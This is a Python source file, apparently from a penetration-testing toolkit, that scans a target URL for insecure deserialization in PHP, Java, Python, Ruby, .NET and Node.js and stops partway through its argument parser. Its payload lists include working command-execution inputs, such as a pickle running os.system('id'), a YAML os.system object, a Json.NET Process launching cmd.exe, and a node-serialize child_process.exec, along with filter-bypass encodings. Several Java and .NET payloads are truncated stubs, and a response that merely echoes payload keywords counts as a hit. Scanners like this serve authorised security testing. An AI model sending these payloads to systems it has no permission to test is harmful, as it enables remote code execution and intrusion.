#!/usr/bin/env python3

"""Modulo de deteccao de Deserialization Injection (PHP/Java/Python).



Testa se o servidor e vulneravel a desserializacao de objetos via:

  - PHP — payloads O:, a:, r: (unserialize), POP chains

  - Java — magic bytes \xac\xed\x00\x05, gadget chains, JNDI

  - Python — pickle \x80\x04\x95, __reduce__, YAML !python/object/apply:

  - Detect — erros, timing, reflecao de dados serializados

  - Bypass — encoding, compressao, nesting para contornar filtros



Fluxo:

  1. Envia payloads de desserializacao em parametros de entrada

  2. Verifica se a resposta indica desserializacao bem-sucedida

  3. Se detectado, envia payloads de exploit

  4. Classifica: detectado, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
import time
from collections.abc import Sequence
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.deserialinject")


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "php": [
        "php_basic",
        "php_pop_chain",
        "php_ref_inject",
        "php_array_cast",
        "php_object_inject",
    ],
    "java": [
        "java_magic_bytes",
        "java_obj_stream",
        "java_gadget_cc",
        "java_gadget_spring",
        "java_jndi",
    ],
    "python": [
        "python_pickle",
        "python_reduce",
        "python_yaml",
        "python_marshal",
        "python_shelve",
    ],
    "detect": [
        "error_leak",
        "timing_anomaly",
        "reflected_data",
        "type_confusion",
        "cookie_inject",
    ],
    "bypass": [
        "url_encode",
        "base64_wrap",
        "double_encode",
        "gzip_compress",
        "nested_serial",
    ],
    "ruby": ["ruby_marshal", "ruby_yaml", "ruby_erb", "ruby_pysch", "ruby_symbol"],
    "dotnet": [
        "dotnet_binary",
        "dotnet_viewstate",
        "dotnet_jsonnet",
        "dotnet_soap",
        "dotnet_objstate",
    ],
    "nodejs": ["node_serialize", "node_child", "node_fs", "node_eval", "node_process"],
}


_PHP_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "php_basic",
        'O:4:"User":1:{s:4:"name";s:6:"admin";}',
        ["admin", "User", "serialize", "unserialize", "object"],
    ),
    (
        "php_pop_chain",
        'O:12:"PHPObjInject":1:{s:4:"cmd";s:6:"whoami";}',
        ["PHPObjInject", "cmd", "whoami", "serialize"],
    ),
    (
        "php_ref_inject",
        'a:2:{i:0;R:1;i:1;s:6:"admin";}',
        ["admin", "R:1", "reference", "serialize"],
    ),
    (
        "php_array_cast",
        'a:1:{s:4:"user";s:6:"admin";}',
        ["admin", "user", "array", "serialize"],
    ),
    (
        "php_object_inject",
        'O:8:"stdClass":1:{s:4:"role";s:5:"admin";}',
        ["admin", "role", "stdClass", "serialize"],
    ),
]


_JAVA_PAYLOADS_DEFAULT: list[tuple[str, str | bytes, list[str | bytes]]] = [
    (
        "java_magic_bytes",
        b"\xac\xed\x00\x05\x73\x72\x00\x11",
        [b"\xac\xed", "serialization", "java", "object"],
    ),
    (
        "java_obj_stream",
        b"\xac\xed\x00\x05\x74\x00\x04test",
        [b"\xac\xed", "ObjectInputStream", "readObject", "java"],
    ),
    (
        "java_gadget_cc",
        b"\xac\xed\x00\x05\x73\x72\x00\x3a",
        [b"\xac\xed", "gadget", "Commons", "Collections", "RCE"],
    ),
    (
        "java_gadget_spring",
        b"\xac\xed\x00\x05\x73\x72\x00\x2f",
        [b"\xac\xed", "Spring", "gadget", "RCE", "deserialize"],
    ),
    (
        "java_jndi",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        ["rO0AB", "JNDI", "java", "HashMap", "serialize"],
    ),
]


_PYTHON_PAYLOADS_DEFAULT: list[tuple[str, str | bytes, list[str | bytes]]] = [
    (
        "python_pickle",
        b"\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x04os\x94\x8c\x06system\x94\x8c\x04id\x94\x93\x94.",
        [b"\x80\x04", "pickle", "reduce", "os.system", "serialize"],
    ),
    (
        "python_reduce",
        'cbuiltins\neval\n(S\'__import__("os").system("id")\'tR.',
        ["eval", "__import__", "os.system", "pickle", "reduce"],
    ),
    (
        "python_yaml",
        "!!python/object/apply:os.system [id]",
        ["!!python", "object/apply", "os.system", "yaml", "deserialize"],
    ),
    (
        "python_marshal",
        b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        [b"\xe3", "marshal", "code", "compile", "deserialize"],
    ),
    (
        "python_shelve",
        b"\x80\x04\x95\x0e\x00\x00\x00\x00\x00\x00\x00\x8c\x04shelve",
        [b"\x80\x04", "shelve", "pickle", "serialize", "marshal"],
    ),
]


_DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "error_leak",
        'O:99:"NonExistentClass":0:{}',
        ["NonExistentClass", "unserialize", "fatal", "error", "class"],
    ),
    (
        "timing_anomaly",
        'O:4:"User":1:{s:4:"name";s:6:"admin";}',
        ["admin", "User", "object", "serialize"],
    ),
    (
        "reflected_data",
        'O:4:"Test":0:{}',
        ["Test", "O:4", "serialize", "object"],
    ),
    (
        "type_confusion",
        "a:0:{}",
        ["a:0", "array", "serialize", "empty"],
    ),
    (
        "cookie_inject",
        'O:4:"User":1:{s:4:"role";s:5:"admin";}',
        ["admin", "role", "User", "object", "serialize"],
    ),
]


_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "url_encode",
        "O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22admin%22%3B%7D",
        ["O:4", "User", "admin", "serialize"],
    ),
    (
        "base64_wrap",
        "TzE6IlVzZXIiOjE6OntzOjQ6Im5hbWUiO3M6NjoiYWRtaW4iO30=",
        ["O:4", "User", "admin", "serialize"],
    ),
    (
        "double_encode",
        "O%253A4%253A%2522User%2522%253A1%253A",
        ["O:4", "User", "serialize", "double"],
    ),
    (
        "gzip_compress",
        "H4sIAAAAAAAAA8tIzcnJVyjPL8pJUQQAAAD//w==",
        ["gzip", "compress", "serialize", "decode"],
    ),
    (
        "nested_serial",
        'a:1:{i:0;O:4:"User":1:{s:4:"name";s:6:"admin";}}',
        ["admin", "User", "nested", "array", "serialize"],
    ),
]


_RUBY_PAYLOADS_DEFAULT: list[tuple[str, str | bytes, list[str | bytes]]] = [
    (
        "ruby_marshal",
        b"\x04\x08I\x40\x06\x01\x06\x06T\x30\x06\x06n\x06\x10admin",
        [b"\x04\x08", "Marshal", "ruby", "serialize", "object"],
    ),
    (
        "ruby_yaml",
        "--- !ruby/object:Gem::Installer\\ni: x",
        ["!ruby/object", "Gem::Installer", "yaml", "deserialize", "ruby"],
    ),
    (
        "ruby_erb",
        "<%= system('id') %>",
        ["system", "erb", "ruby", "eval", "execute"],
    ),
    (
        "ruby_pysch",
        "--- !ruby/object:Gem::Requirement\\nrequirements:\\n  !ruby/object:Gem::StubSpecification\\n    loaded_from: |2\\n      \\x00\\x00\\x00\\x00admin",
        ["!ruby/object", "Psych", "yaml", "deserialize", "Gem"],
    ),
    (
        "ruby_symbol",
        '{"json_class":"Symbol","s":"admin"}',
        ["Symbol", "json_class", "ruby", "serialize", "admin"],
    ),
]


_DOTNET_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "dotnet_binary",
        "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uV29ya3Nsb3cuV29ya2Jvb2s=",
        ["AAEAAAD", "BinaryFormatter", "System", "serialize", "dotnet"],
    ),
    (
        "dotnet_viewstate",
        "dDwtMTE3MTQ3NTQ0OTt0PDtsPGk8ZDw7bDxpPDA+O2k8Mj47aTwv...==",
        ["viewstate", "ASP.NET", "deserialize", "f:", "t:"],
    ),
    (
        "dotnet_jsonnet",
        '{"$type":"System.Diagnostics.Process, System","FileName":"cmd.exe","Arguments":"/c id"}',
        ["$type", "TypeNameHandling", "json", "deserialize", "System"],
    ),
    (
        "dotnet_soap",
        '<SOAP-ENV:Body><m:Ping xmlns:m="http://tempuri.org/"><f xsi:type="xsd:string">admin</f></m:Ping></SOAP-ENV:Body>',
        ["SOAP", "deserialize", "Body", "type", "dotnet"],
    ),
    (
        "dotnet_objstate",
        "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uRnJhbWV3b3JrLkFzcGVtYmxpZXM=",
        ["AAEAAAD", "ObjectStateFormatter", "System", "serialize", "frame"],
    ),
]


_NODEJS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "node_serialize",
        '{"rce":"_$$ND_FUNC$$_function(){require("child_process").exec("id")}()"}',
        ["_$$ND_FUNC$$", "node-serialize", "rce", "function", "require"],
    ),
    (
        "node_child",
        '{"__proto__":{"child_process":true}}',
        ["__proto__", "child_process", "node", "pollute", "rce"],
    ),
    (
        "node_fs",
        '{"__proto__":{"fs":true}}',
        ["__proto__", "fs", "node", "readFile", "file"],
    ),
    (
        "node_eval",
        '{"__proto__":{"eval":true}}',
        ["__proto__", "eval", "node", "execute", "code"],
    ),
    (
        "node_process",
        '{"__proto__":{"process":{"env":true}}}',
        ["__proto__", "process", "env", "node", "leak"],
    ),
]


_SSI_PARAMS_DEFAULT: list[str] = [
    "data",
    "json",
    "payload",
    "input",
    "value",
    "content",
    "body",
    "params",
    "query",
    "config",
    "options",
    "settings",
    "item",
    "object",
    "model",
]


def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "deserialinject", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()


def _load_php_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"php_payloads": [list(t) for t in _PHP_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("php_payloads", [list(t) for t in _PHP_PAYLOADS_DEFAULT])
    ]


_PHP_PAYLOADS = _load_php_payloads()


def _load_java_payloads() -> list[tuple[str, str | bytes, list[str | bytes]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"java_payloads": [list(t) for t in _JAVA_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("java_payloads", [list(t) for t in _JAVA_PAYLOADS_DEFAULT])
    ]


_JAVA_PAYLOADS = _load_java_payloads()


def _load_python_payloads() -> list[tuple[str, str | bytes, list[str | bytes]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"python_payloads": [list(t) for t in _PYTHON_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "python_payloads", [list(t) for t in _PYTHON_PAYLOADS_DEFAULT]
        )
    ]


_PYTHON_PAYLOADS = _load_python_payloads()


def _load_detect_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"detect_payloads": [list(t) for t in _DETECT_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "detect_payloads", [list(t) for t in _DETECT_PAYLOADS_DEFAULT]
        )
    ]


_DETECT_PAYLOADS = _load_detect_payloads()


def _load_bypass_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]
        )
    ]


_BYPASS_PAYLOADS = _load_bypass_payloads()


def _load_ruby_payloads() -> list[tuple[str, str | bytes, list[str | bytes]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"ruby_payloads": [list(t) for t in _RUBY_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("ruby_payloads", [list(t) for t in _RUBY_PAYLOADS_DEFAULT])
    ]


_RUBY_PAYLOADS = _load_ruby_payloads()


def _load_dotnet_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"dotnet_payloads": [list(t) for t in _DOTNET_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "dotnet_payloads", [list(t) for t in _DOTNET_PAYLOADS_DEFAULT]
        )
    ]


_DOTNET_PAYLOADS = _load_dotnet_payloads()


def _load_nodejs_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "deserialinject",
        default={"nodejs_payloads": [list(t) for t in _NODEJS_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "nodejs_payloads", [list(t) for t in _NODEJS_PAYLOADS_DEFAULT]
        )
    ]


_NODEJS_PAYLOADS = _load_nodejs_payloads()


def _load_ssi_params() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "deserialinject", default={"ssi_params": _SSI_PARAMS_DEFAULT}
    )

    return data.get("ssi_params", _SSI_PARAMS_DEFAULT)


_SSI_PARAMS = _load_ssi_params()


@dataclass(frozen=True, slots=True)
class DeserialAttempt:
    """Tentativa individual de Deserialization Injection."""

    technique: str

    category: str

    payload: str | bytes

    param: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class DeserialResult:
    """Resultado consolidado do scan de Deserialization Injection."""

    target: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[DeserialAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


def _check_deserial_response(
    body: bytes, status: int, indicators: Sequence[str | bytes]
) -> bool:
    """Verifica se a resposta indica desserializacao."""

    if status == 0:
        return False

    text = body.decode("utf-8", errors="ignore").lower()

    for indicator in indicators:
        if isinstance(indicator, bytes):
            if indicator in body:
                return True
        elif indicator.lower() in text:
            return True

    return False


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter tamanho e status de referencia."""

    try:
        resp = await client.get(url, follow_redirects=True)

        return resp.status_code, len(resp.content), resp.content

    except httpx.RequestError:
        return 0, 0, b""


async def _test_php(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization PHP."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _PHP_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                json_data = {param: payload}

                resp = await client.post(url, json=json_data, follow_redirects=True)

                vulnerable = _check_deserial_response(
                    resp.content, resp.status_code, indicators
                )

                results.append(
                    DeserialAttempt(
                        technique=technique,
                        category="php",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="ysoserial_payload" if vulnerable else "",
                        tool="ysoserial",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    DeserialAttempt(
                        technique=technique,
                        category="php",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_java(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization Java."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _JAVA_PAYLOADS:
        param = _SSI_PARAMS[0]
        try:
            resp = await client.post(
                url,
                content=payload.encode() if isinstance(payload, str) else payload,
                follow_redirects=True,
            )

            vulnerable = _check_deserial_response(
                resp.content, resp.status_code, indicators
            )

            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="java",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}"
                    if vulnerable
                    else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                )
            )

        except httpx.RequestError as e:
            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="java",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_python(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization Python."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _PYTHON_PAYLOADS:
        param = _SSI_PARAMS[0]
        try:
            resp = await client.post(
                url,
                content=payload.encode() if isinstance(payload, str) else payload,
                follow_redirects=True,
            )

            vulnerable = _check_deserial_response(
                resp.content, resp.status_code, indicators
            )

            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="python",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}"
                    if vulnerable
                    else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                )
            )

        except httpx.RequestError as e:
            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="python",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_detect(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deteccao generica."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                if technique == "timing_anomaly":
                    t0 = time.monotonic()

                    await client.post(url, json={param: ""}, follow_redirects=True)

                    baseline_elapsed = time.monotonic() - t0

                    t0 = time.monotonic()

                    resp = await client.post(
                        url, json={param: payload}, follow_redirects=True
                    )

                    elapsed = time.monotonic() - t0

                    vulnerable = elapsed > 2.0 and elapsed >= baseline_elapsed + 1.0

                else:
                    resp = await client.post(
                        url, json={param: payload}, follow_redirects=True
                    )

                    vulnerable = _check_deserial_response(
                        resp.content, resp.status_code, indicators
                    )

                results.append(
                    DeserialAttempt(
                        technique=technique,
                        category="detect",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"param={param}, indicators={indicators}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="ysoserial_payload" if vulnerable else "",
                        tool="ysoserial",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    DeserialAttempt(
                        technique=technique,
                        category="detect",
                        payload=payload,
                        param=param,
                        method="post_json",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de bypass de filtros."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        param = _SSI_PARAMS[0]
        try:
            json_data = {param: payload}

            resp = await client.post(url, json=json_data, follow_redirects=True)

            vulnerable = _check_deserial_response(
                resp.content, resp.status_code, indicators
            )

            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}"
                    if vulnerable
                    else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                )
            )

        except httpx.RequestError as e:
            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_ruby(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization Ruby."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _RUBY_PAYLOADS:
        param = _SSI_PARAMS[0]
        try:
            resp = await client.post(
                url,
                content=payload.encode() if isinstance(payload, str) else payload,
                follow_redirects=True,
            )

            vulnerable = _check_deserial_response(
                resp.content, resp.status_code, indicators
            )

            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="ruby",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}"
                    if vulnerable
                    else "",
                    error="",
                    exploit="marshal_payload" if vulnerable else "",
                    tool="marshal",
                )
            )

        except httpx.RequestError as e:
            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="ruby",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_dotnet(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization .NET."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _DOTNET_PAYLOADS:
        param = _SSI_PARAMS[0]
        try:
            resp = await client.post(
                url,
                content=payload.encode() if isinstance(payload, str) else payload,
                follow_redirects=True,
            )

            vulnerable = _check_deserial_response(
                resp.content, resp.status_code, indicators
            )

            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="dotnet",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}"
                    if vulnerable
                    else "",
                    error="",
                    exploit="binary_formatter_payload" if vulnerable else "",
                    tool="ysoserial.net",
                )
            )

        except httpx.RequestError as e:
            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="dotnet",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_nodejs(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization Node.js."""

    b_status, b_size, _ = baseline

    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _NODEJS_PAYLOADS:
        param = _SSI_PARAMS[0]
        try:
            json_data = {param: payload}

            resp = await client.post(url, json=json_data, follow_redirects=True)

            vulnerable = _check_deserial_response(
                resp.content, resp.status_code, indicators
            )

            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="nodejs",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}"
                    if vulnerable
                    else "",
                    error="",
                    exploit="node_serialize_rce" if vulnerable else "",
                    tool="node-serialize",
                )
            )

        except httpx.RequestError as e:
            results.append(
                DeserialAttempt(
                    technique=technique,
                    category="nodejs",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


def print_results(result: DeserialResult) -> None:
    """Exibe os resultados do scan de Deserialization Injection."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if a.error and "403" in a.error]

    if vuln:
        print(color("\n[!] VULNERABILIDADES DETECTADAS:", Cyber.RED, Cyber.BOLD))

        for v in vuln:
            print(color(f"  [!] {v.technique} via {v.param}", Cyber.RED))

            print(f"      Payload: {v.payload[:80]}...")

            if v.details:
                print(f"      Detalhes: {v.details}")

            print_exploit_info(v.exploit, v.tool)

    else:
        print(
            color(
                "\n  [+] Nenhuma Deserialization Injection detectada",
                Cyber.GREEN,
                Cyber.BOLD,
            )
        )

    if blocked:
        print(
            color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW)
        )

    errors = [a for a in result.attempts if a.error and "403" not in a.error]

    if errors:
        print(color(f"\n  [-] {len(errors)} erros de conexao", Cyber.GRAY))

    print(
        color(
            f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
            Cyber.WHITE,
        )
    )


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan de Deserialization Injection."""

    logger.info("Deserialization scan para %s", target)

    async with create_async_client(timeout=timeout, proxy=proxy) as client:
        b_status, b_size, _ = await _test_baseline(client, target)

        if b_status == 0:
            print(color("[-] Nao foi possivel conectar ao alvo", Cyber.RED))

            return 1

        print(color(f"[*] Baseline: status={b_status}, size={b_size}", Cyber.CYAN))

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        all_attempts: list[DeserialAttempt] = []

        for cat in test_categories:
            if cat == "php":
                attempts = await _test_php(client, target, (b_status, b_size, b""))

            elif cat == "java":
                attempts = await _test_java(client, target, (b_status, b_size, b""))

            elif cat == "python":
                attempts = await _test_python(client, target, (b_status, b_size, b""))

            elif cat == "detect":
                attempts = await _test_detect(client, target, (b_status, b_size, b""))

            elif cat == "bypass":
                attempts = await _test_bypass(client, target, (b_status, b_size, b""))

            elif cat == "ruby":
                attempts = await _test_ruby(client, target, (b_status, b_size, b""))

            elif cat == "dotnet":
                attempts = await _test_dotnet(client, target, (b_status, b_size, b""))

            elif cat == "nodejs":
                attempts = await _test_nodejs(client, target, (b_status, b_size, b""))

            else:
                continue

            all_attempts.extend(attempts)

        vulnerable = [a for a in all_attempts if a.vulnerable]

        blocked = [a for a in all_attempts if a.error and "403" in a.error]

        issues = [f"VULN: {a.technique} via {a.param}" for a in vulnerable]

        result = DeserialResult(
            target=target,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=target.startswith("https"),
            attempts=all_attempts,
            vulnerable_techniques=[a.technique for a in vulnerable],
            blocked_techniques=[a.technique for a in blocked],
            issues=issues,
            overall_status="vulnerable" if vulnerable else "secure",
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        if output_file:
            data = asdict(result)

            for attempt in data["attempts"]:
                if isinstance(attempt["payload"], bytes):
                    attempt["payload"] = attempt["payload"].hex()

            write_output(output_file, data)

            logger.info("Resultados salvos em %s", output_file)

        return 1 if vulnerable else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""

    art = r"""

  ____                            _       _   _             ____       _

 |  _ \  _____      _____ _ __ __| | ___ | |_(_)_ __   ___|  _ \ __ _| |

 | | | |/ _ \ \ /\ / / _ \ '__/ _` |/ _ \| __| | '_ \ / _ \ |_) / _` | |

 | |_| |  __/\ V  V /  __/ | | (_| | (_) | |_| | | | |  __/  __/ (_| | |

 |____/ \___| \_/\_/ \___|_|  \__,_|\___/ \__|_|_| |_|\___|_|   \__,_|_|

"""

    create_banner(art, "   deserialization: PHP / Java / Python serialize exploit")()


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""

    parser = argparse.ArgumentParser(
        prog="mytools-deserial",
        description="Deserialization Injection — detecta desserializacao em PHP/Java/Python",
    )

    parser.add_argument("url", help="URL alvo (ex: https://example.com)")

    parser.add_argument(
        "-c",
        "--category",
